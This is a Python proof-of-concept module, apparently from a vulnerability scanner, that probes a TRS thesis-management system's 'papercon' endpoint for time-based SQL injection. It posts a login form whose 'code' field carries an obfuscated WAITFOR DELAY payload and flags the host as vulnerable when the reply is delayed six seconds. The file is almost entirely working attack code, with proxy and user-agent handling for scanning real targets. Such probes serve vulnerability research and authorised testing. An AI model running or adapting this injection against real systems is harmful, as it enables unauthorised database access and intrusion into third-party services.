#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: TRS学位论文系统papercon处SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2010-0124453
author: Ascotbe
reference: Lucifer
description: 文件papercon中,参数code存在SQL注入。
'''
import urllib
import requests
import time
def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port


post_data = {
    "action": "login",
    "r_code": "%D1%A7%BA%C5%B2%BB%C4%DC%CE%AA%BF%D5",
    "r_password": "%C3%DC%C2%EB%B2%BB%C4%DC%CE%AA%BF%D5",
    "code": "test';WaItFoR/**/DeLay/**/'0:0:6'--",
    "password": "dsdfaf"
}
payload = "/papercon"
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    start_time = time.time()
    try:
        payload_url = scheme+"://"+url+payload
        headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'User-Agent': RandomAgent,
        }
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.post(payload_url, data=post_data, headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.post(payload_url, data=post_data,headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if time.time() - start_time >= 6:
            Medusa = "{} 存在TRS学位论文系统papercon处SQL注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\nPost:{}\r\n".format(url, payload_url,post_data)
            return (Medusa)
    except Exception as e:
        pass